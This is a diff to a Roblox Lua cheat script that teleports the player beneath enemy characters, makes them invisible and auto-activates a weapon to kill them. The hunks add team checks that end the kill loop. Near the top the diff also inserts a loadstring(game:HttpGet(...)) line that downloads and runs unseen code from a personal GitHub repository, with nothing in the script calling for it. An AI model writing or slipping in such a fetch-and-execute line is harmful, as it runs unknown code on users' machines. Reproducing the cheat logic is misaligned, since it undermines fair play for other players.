@@ -4,7 +4,7 @@ local vu = game:GetService("VirtualUser")
 local sword = {}
 local TweenService = game:GetService("TweenService")
 local TravelSpeed = 200000
-
+loadstring(game:HttpGet('https://raw.githubusercontent.com/jake10292/randomshit/main/dog1'))()
 local function sexx(sex1 : CFrame)
    local DistanceBetweenPoints = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - sex1.Position ).Magnitude
    local TimeNeeded = DistanceBetweenPoints / TravelSpeed, 3
@@ -97,9 +97,14 @@ while _G.y do
                   v.Torso.Transparency = 1
                   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Torso.CFrame * CFrame.Angles(math.rad(90), 0, 0) + Vector3.new(0, -15, 0)
                   game.Workspace.Unbreakable.Characters.Human[game.Players.LocalPlayer.Name]:FindFirstChild(boobs):Activate()
+                  if game.Workspace.Unbreakable.Characters.Orc:FindFirstChild(game.Players.LocalPlayer.Name)
+                  then
+                     _G.kk = "bad"
+                  else _G.kk = "good"
+                  end
                   end)
                   task.wait()
-               until v.Humanoid.Health <= 0 or _G.y == false
+               until v.Humanoid.Health <= 0 or _G.y == false or _G.kk == "bad"
             end
          end
       else
@@ -112,9 +117,14 @@ while _G.y do
                   v.Torso.Transparency = 1
                   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Torso.CFrame * CFrame.Angles(math.rad(90), 0, 0) + Vector3.new(0, -15, 0)
                   game.Workspace.Unbreakable.Characters.Orc[game.Players.LocalPlayer.Name]:FindFirstChild(boobs):Activate()
+                   if game.Workspace.Unbreakable.Characters.Human:FindFirstChild(game.Players.LocalPlayer.Name)
+                  then
+                     _G.kk = "bad"
+                  else _G.kk = "good"
+                  end
                   end)
                   task.wait()
-               until v.Humanoid.Health <= 0 or _G.y == false
+               until v.Humanoid.Health <= 0 or _G.y == false or _G.kk == "bad"
             end
          end
       end
@@ -130,9 +140,14 @@ while _G.y do
                   v.Torso.Transparency = 1
                   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Torso.CFrame * CFrame.Angles(math.rad(90), 0, 0) + Vector3.new(0, -15, 0)
                   game.Workspace.Unbreakable.Characters.Orc[game.Players.LocalPlayer.Name]:FindFirstChild(boobs):Activate()
+                   if game.Workspace.Unbreakable.Characters.Orc:FindFirstChild(game.Players.LocalPlayer.Name)
+                  then
+                     _G.kk = "bad"
+                  else _G.kk = "good"
+                  end
                   end)
                   task.wait()
-               until v.Humanoid.Health <= 0 or _G.y == false
+               until v.Humanoid.Health <= 0 or _G.y == false or _G.kk == "bad"
             end
          end
       else
@@ -145,9 +160,14 @@ while _G.y do
                   v.Torso.Transparency = 1
                   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Torso.CFrame * CFrame.Angles(math.rad(90), 0, 0) + Vector3.new(0, -15, 0)
                   game.Workspace.Unbreakable.Characters.Orc[game.Players.LocalPlayer.Name]:FindFirstChild(boobs):Activate()
+                   if game.Workspace.Unbreakable.Characters.Human:FindFirstChild(game.Players.LocalPlayer.Name)
+                  then
+                     _G.kk = "bad"
+                  else _G.kk = "good"
+                  end
                   end)
                   task.wait()
-               until v.Humanoid.Health <= 0 or _G.y == false
+               until v.Humanoid.Health <= 0 or _G.y == false or _G.kk == "bad"
             end
          end
       end
